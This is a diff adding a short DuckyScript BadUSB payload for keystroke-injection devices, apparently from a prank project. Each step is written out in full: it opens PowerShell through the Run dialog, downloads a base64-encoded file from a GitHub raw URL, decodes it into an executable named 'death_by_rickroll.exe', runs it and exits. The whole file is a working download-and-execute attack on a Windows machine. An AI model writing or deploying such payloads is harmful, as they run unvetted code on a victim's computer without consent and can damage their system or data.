@@ -1,0 +1,26 @@
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+
+REM Download encoded executable
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/RickRoll/RickRoll_Advanced/Be_Very_Careful/death_by_rickroll_enc.txt'; $out='death_by_rickroll_enc.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+ENTER
+DELAY 1000
+
+REM Decode the file and save as .exe
+STRING $data=Get-Content -Path death_by_rickroll_enc.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('death_by_rickroll.exe', $decoded)
+ENTER
+DELAY 1000
+
+REM Execute the decoded .exe file
+STRING Start-Process -FilePath .\death_by_rickroll.exe
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
